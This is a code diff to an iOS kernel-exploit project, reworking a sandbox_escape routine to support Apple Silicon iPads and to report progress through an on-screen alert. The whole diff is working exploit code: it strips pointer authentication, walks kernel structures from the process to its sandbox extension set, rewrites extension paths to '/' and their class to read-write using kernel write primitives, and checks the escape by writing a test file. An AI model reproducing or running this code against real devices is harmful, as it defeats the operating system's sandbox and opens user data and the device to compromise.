@@ -32,6 +32,7 @@
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/krw.h"
 #include "kexploit/offsets.h"
+#include "ProgressAlert.h"
 
 extern void early_kread(uint64_t where, void *read_buf, size_t size);
 
@@ -47,17 +48,38 @@ extern void early_kread(uint64_t where, void *read_buf, size_t size);
 #define OFF_EXT_DATALEN        0x48  // ext → data_len
 
 #ifdef __arm64e__
-static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
-    asm(".long 0xDAC143E0");
+// XPACI X0 — strips instruction-pointer auth (used on iPhones/PAC phones)
+static uint64_t __attribute((naked)) __xpaci_ia(uint64_t a) {
+    asm(".long 0xDAC143E0"); // XPACI X0
     asm("ret");
+}
+// XPACD X0 — strips data-pointer auth (used on M1+ iPads; ucred/proc_ro are data ptrs)
+static uint64_t __attribute((naked)) __xpacd_da(uint64_t a) {
+    asm(".long 0xDAC147E0"); // XPACD X0
+    asm("ret");
+}
+// Runtime dispatch: M1+ iPad uses XPACD, everything else uses XPACI
+static inline uint64_t __xpaci_sbx(uint64_t a) {
+    return gIsAppleSiliconIPad ? __xpacd_da(a) : __xpaci_ia(a);
 }
 #else
 #define __xpaci_sbx(x) (x)
 #endif
 
+extern uint64_t VM_MIN_KERNEL_ADDRESS;
+
+// S() — strip PAC then sign-extend to a full kernel address.
+// On iPhone: after XPACI the upper bits may be zeroed; OR restores the canonical sign.
+// On M1+ iPad: after XPACD the pointer is already canonical (0xFFFFFE...) —
+//   ORing 0xFFFFFF8000000000 would corrupt it, so we skip it.
 #define S(x) ({ uint64_t _v = __xpaci_sbx(x); \
-    ((_v >> 32) > 0xFFFF ? (_v | 0xFFFFFF8000000000ULL) : _v); })
-#define K(x) ((x) > 0xFFFFFF8000000000ULL)
+    (gIsAppleSiliconIPad ? _v : ((_v >> 32) > 0xFFFF ? (_v | 0xFFFFFF8000000000ULL) : _v)); })
+
+// K() — true if the value looks like a kernel address on this device.
+// VM_MIN_KERNEL_ADDRESS is set dynamically by offsets_init():
+//   iPhone:        0xFFFFFFDC00000000
+//   M1/M2/M3/M4 iPad: 0xFFFFFE0000000000
+#define K(x) ((x) >= VM_MIN_KERNEL_ADDRESS)
 
 #pragma mark - Extension patching
 
@@ -111,76 +133,125 @@ static void set_rw_class(uint64_t hdr) {
 #pragma mark - Main entry
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
 
+    // ── Step 1: validate self_proc ─────────────────────────────────────────────
+    progress_log(@"sbx: validating self_proc pointer");
+    if (!self_proc) {
+        progress_fail(@"sbx: self_proc is NULL — aborting");
+        return -1;
+    }
+    progress_ok([NSString stringWithFormat:@"sbx: self_proc = 0x%llx", self_proc]);
+    progress_set(70.f);
+
+    // ── Step 2: read proc_ro ──────────────────────────────────────────────────
+    progress_log(@"sbx: reading proc → proc_ro (offset 0x18)");
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
     uint64_t proc_ro = S(proc_ro_raw);
-    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
+    if (!K(proc_ro)) {
+        progress_fail([NSString stringWithFormat:
+            @"sbx: proc_ro invalid (raw=0x%llx stripped=0x%llx)", proc_ro_raw, proc_ro]);
+        return -1;
+    }
+    progress_ok([NSString stringWithFormat:@"sbx: proc_ro = 0x%llx", proc_ro]);
+    progress_set(72.f);
 
-    // Scan proc_ro for ucred — offset varies by iOS build.
-    // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    NSLog(@"[SBX] Scanning proc_ro for ucred...");
+    // ── Step 3: scan proc_ro for ucred ────────────────────────────────────────
+    progress_log(@"sbx: scanning proc_ro[0x10..0x40] for ucred");
     uint64_t ucred = 0;
     for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
         uint64_t pac = S(raw);
-        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
 
-        // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
+        // SMR path
         if (K(smr)) {
             uint64_t maybe_label = S(early_kread64(smr + 0x78));
             if (K(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                 if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
+                    progress_ok([NSString stringWithFormat:
+                        @"sbx: ucred @ proc_ro+0x%x via SMR = 0x%llx", off, smr]);
                     ucred = smr;
                     break;
                 }
             }
         }
-        // Also try PAC-stripped
+        // PAC-stripped path
         if (!ucred && K(pac)) {
             uint64_t maybe_label = S(early_kread64(pac + 0x78));
             if (K(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
                 if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
+                    progress_ok([NSString stringWithFormat:
+                        @"sbx: ucred @ proc_ro+0x%x via PAC = 0x%llx", off, pac]);
                     ucred = pac;
                     break;
                 }
             }
         }
     }
-    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
+    if (!K(ucred)) {
+        progress_fail(@"sbx: ucred NOT FOUND in proc_ro — wrong offsets?");
+        return -1;
+    }
+    progress_set(74.f);
 
+    // ── Step 4: walk ucred → cr_label → sandbox → ext_set ────────────────────
+    progress_log(@"sbx: reading ucred → cr_label (offset 0x78)");
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
+    if (!K(label)) {
+        progress_fail([NSString stringWithFormat:@"sbx: cr_label invalid (0x%llx)", label]);
+        return -1;
+    }
+    progress_ok([NSString stringWithFormat:@"sbx: cr_label = 0x%llx", label]);
 
+    progress_log(@"sbx: reading cr_label → sandbox (offset 0x10)");
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
+    if (!K(sandbox)) {
+        progress_fail([NSString stringWithFormat:@"sbx: sandbox ptr invalid (0x%llx)", sandbox]);
+        return -1;
+    }
+    progress_ok([NSString stringWithFormat:@"sbx: sandbox = 0x%llx", sandbox]);
 
+    progress_log(@"sbx: reading sandbox → ext_set (offset 0x10)");
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
+    if (!K(ext_set)) {
+        progress_fail([NSString stringWithFormat:@"sbx: ext_set invalid (0x%llx)", ext_set]);
+        return -1;
+    }
+    progress_ok([NSString stringWithFormat:@"sbx: ext_set = 0x%llx", ext_set]);
+    progress_set(78.f);
 
-    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
-          proc_ro, ucred, label, sandbox, ext_set);
-
+    // ── Step 5: patch extension paths to "/" ──────────────────────────────────
+    progress_log(@"sbx: patching all 16 ext_set hash slots — path → \"/\"");
     int patched = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr)) patched += patch_chain(hdr);
     }
-    NSLog(@"[SBX] Patched %d extensions", patched);
+    if (patched > 0) {
+        progress_ok([NSString stringWithFormat:@"sbx: patched %d extension path(s) → \"/\"", patched]);
+    } else {
+        progress_warn(@"sbx: 0 extensions patched — ext_set may be empty");
+    }
+    progress_set(83.f);
 
+    // ── Step 6: rewrite extension class to read-write ─────────────────────────
+    progress_log(@"sbx: rewriting extension class → com.apple.app-sandbox.read-write");
     int classed = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
     }
-    NSLog(@"[SBX] Changed %d extension classes", classed);
+    if (classed > 0) {
+        progress_ok([NSString stringWithFormat:@"sbx: rewrote class on %d slot(s)", classed]);
+    } else {
+        progress_warn(@"sbx: 0 extension classes rewritten");
+    }
+    progress_set(87.f);
 
+    // ── Step 7: fill empty hash slots ─────────────────────────────────────────
+    progress_log(@"sbx: filling empty ext_set hash slots");
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
         uint64_t h = S(early_kread64(ext_set + s * 8));
@@ -192,17 +263,25 @@ int sandbox_escape(uint64_t self_proc) {
             uint64_t h = early_kread64(ext_set + s * 8);
             if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
         }
-        NSLog(@"[SBX] Filled %d empty hash slots", filled);
+        progress_ok([NSString stringWithFormat:@"sbx: filled %d empty hash slot(s)", filled]);
+    } else {
+        progress_warn(@"sbx: no valid src slot found — skipping slot fill");
     }
+    progress_set(90.f);
 
+    // ── Step 8: verify sandbox escape ────────────────────────────────────────
+    progress_log(@"sbx: verification — write test to /var/mobile/.sbx_test");
     int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }
-
     if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
+        close(fd_w);
+        unlink("/var/mobile/.sbx_test");
+        progress_ok(@"sbx: *** SANDBOX ESCAPED (R+W VERIFIED) ***");
+        progress_set(93.f);
         return 0;
     }
 
-    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
+    progress_fail([NSString stringWithFormat:
+        @"sbx: write test FAILED (errno=%d: %s) — sandbox NOT escaped", errno, strerror(errno)]);
+    progress_set(93.f);
     return -1;
 }
